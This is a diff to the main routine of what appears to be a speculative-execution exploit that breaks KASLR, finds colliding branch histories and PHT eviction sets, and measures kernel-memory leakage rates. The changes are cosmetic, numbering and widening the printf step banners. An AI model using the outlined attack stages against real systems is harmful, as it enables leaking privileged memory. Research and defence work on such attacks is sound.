@@ -287,9 +287,9 @@ int main(int argc, char **argv)
     // ------------------------------------------------------------------------
     // Find the physical map start by KASLR break
 
-    printf("------------------------------------------------------\n");
-    printf("Find physical map start address\n");
-    printf("------------------------------------------------------\n");
+    printf("-----------------------------------------------------------------------------\n");
+    printf("1) Find physical map start address\n");
+    printf("-----------------------------------------------------------------------------\n");
     time_start = time(0);
 
     if (!cfg.phys_start) {
@@ -347,17 +347,20 @@ int main(int argc, char **argv)
     }
     printf(" - Allocated %d PHT eviction sets\n", NUMBER_OF_EVICT_SETS);
 
+    printf("-----------------------------------------------------------------------------\n");
+    printf("2) Start SMT contention workload on sibling core\n");
+    printf("-----------------------------------------------------------------------------\n");
+
     pin_to_core(CORE_TESTING);
     pthread_create(&tid, NULL, start_contention, NULL);
     usleep(300);
 
-
     // ------------------------------------------------------------------------
     // Find a colliding history
 
-    printf("------------------------------------------------------\n");
-    printf("Find a colliding history for the victim -> target\n");
-    printf("------------------------------------------------------\n");
+    printf("-----------------------------------------------------------------------------\n");
+    printf("3) Find a colliding history for the victim -> target\n");
+    printf("-----------------------------------------------------------------------------\n");
     time_start = time(0);
 
 
@@ -388,7 +391,7 @@ int main(int argc, char **argv)
     // ------------------------------------------------------------------------
     // Double check signal
 
-    printf("----------------------------------------------- \n");
+    printf("-----------------------------------------------------------------------------\n");
 
     if (fast_colliding_phase) {
         printf("Leakage rate without eviction:\n");
@@ -406,9 +409,9 @@ int main(int argc, char **argv)
     }
 
 
-    printf("------------------------------------------------------\n");
-    printf("Find a PHT eviction set with a high hit rate\n");
-    printf("------------------------------------------------------\n");
+    printf("-----------------------------------------------------------------------------\n");
+    printf("4) Find a PHT eviction set with a high hit rate\n");
+    printf("-----------------------------------------------------------------------------\n");
     time_start = time(0);
 
 
@@ -476,7 +479,7 @@ int main(int argc, char **argv)
     }
 
     printf("[+] Step took: %ld sec\n", time(0) - time_start);
-    printf("----------------------------------------------- \n");
+    printf("-----------------------------------------------------------------------------\n");
 
 
     for (size_t i = 0; i < 2; i++)
@@ -484,9 +487,9 @@ int main(int argc, char **argv)
         print_leakage_rate(&cfg, 5000);
     }
 
-    printf("------------------------------------------------------\n");
-    printf("Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
-    printf("------------------------------------------------------\n");
+    printf("-----------------------------------------------------------------------------\n");
+    printf("5) Testing the leakage rate with %d kB random values\n", LEAK_RATE_TEST_SIZE / 1024);
+    printf("-----------------------------------------------------------------------------\n");
 
 
 
